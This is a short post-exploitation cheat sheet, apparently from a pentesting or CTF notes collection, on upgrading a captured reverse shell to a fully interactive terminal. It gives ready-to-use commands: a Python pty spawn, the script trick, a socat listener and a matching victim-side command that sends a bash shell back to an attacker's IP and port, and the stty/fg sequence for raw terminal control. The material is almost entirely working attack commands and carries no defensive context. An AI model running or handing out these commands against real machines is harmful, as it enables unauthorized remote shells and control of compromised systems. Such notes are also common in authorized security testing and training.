# Upgrading to Interactive Shells

## Simple upgrades  
Python  
`python -c 'import pty;pty.spawn("/bin/bash")'`  

Script  
```
exec script /dev/null      
Script started, file is /dev/null    
bash
```

Socat  
Listener:  
```socat file:`tty`,raw,echo=0 tcp-listen:<PORT>```

Victim:  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LISTENER_IP>:<PORT>`  

## Upgrading to full interactive shell  
In reverse shell  
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z   
```

Attacker  
```
stty raw -echo  
fg  
```

Victim  
```reset 
export SHELL=bash  
export TERM=xterm-256color  
stty rows <num> columns <cols>  
``` 
